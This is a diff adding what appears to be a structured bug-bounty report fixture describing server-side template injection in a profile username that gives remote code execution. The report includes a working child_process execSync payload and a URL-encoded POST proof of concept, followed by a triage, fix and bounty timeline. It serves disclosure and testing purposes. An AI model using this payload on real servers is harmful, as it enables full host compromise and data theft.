@@ -1,0 +1,63 @@
+id: BRM-011
+title: Server-side template injection in profile username leads to remote code execution
+vulnerability_information: |
+  ## Summary
+  The username rendered on the user profile page is passed through a server-side template engine without escaping. A crafted username breaks out of the data context into template evaluation, giving arbitrary server-side code execution.
+
+  ## Steps to reproduce
+  1. Log in and open the profile page (`/profile`).
+  2. Set the username to a template payload rather than a plain string:
+
+  ```
+  #{global.process.mainModule.require('child_process').execSync('id')}
+  ```
+
+  3. Reload `/profile`. The username field is interpolated server-side and the shell command runs; output is reflected into the rendered page.
+
+  ## PoC
+  ```
+  POST {{base_url}}/profile
+  Authorization: Bearer <token>
+  Content-Type: application/x-www-form-urlencoded
+
+  username=%23%7Bglobal.process.mainModule.require('child_process').execSync('id')%7D
+  ```
+
+  The rendered profile then contains the output of `id`, confirming code execution in the application process.
+
+  ## Root cause
+  User input is concatenated into a template string that the engine evaluates, instead of being bound as a value.
+
+  ## Severity
+  Unauthenticated-adjacent (any registered user) RCE in the app process. Full server compromise. CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H ≈ 9.9 (critical).
+impact: |
+  Arbitrary command execution on the server hosting Bramble Market. From here an attacker can read secrets, pivot, and fully compromise the host and its data. Critical.
+timeline:
+  - after: 35m
+    by: team
+    do: comment
+    message: Reproduced immediately — `id` output rendered back on the profile. This is the one we worry about. Escalating internally.
+  - after: 20m
+    by: team
+    do: comment
+    internal: true
+    message: Confirmed RCE via template eval on username. Treating as sev-critical incident; patch + rotate anything the process can reach.
+  - after: 15m
+    by: team
+    do: state
+    state: triaged
+    message: Triaged as critical. Fix in progress; we're also reviewing what the process had access to as a precaution.
+  - after: 5m
+    by: team
+    do: severity
+    rating: critical
+  - after: 9d
+    by: team
+    do: state
+    state: resolved
+    message: Username is now bound as data and never evaluated as a template; verified the payload no longer executes. Exceptional report — thank you.
+  - after: 1d
+    by: team
+    do: bounty
+    amount: 3000
+    message: Top bounty. Exactly the kind of finding this program exists for.
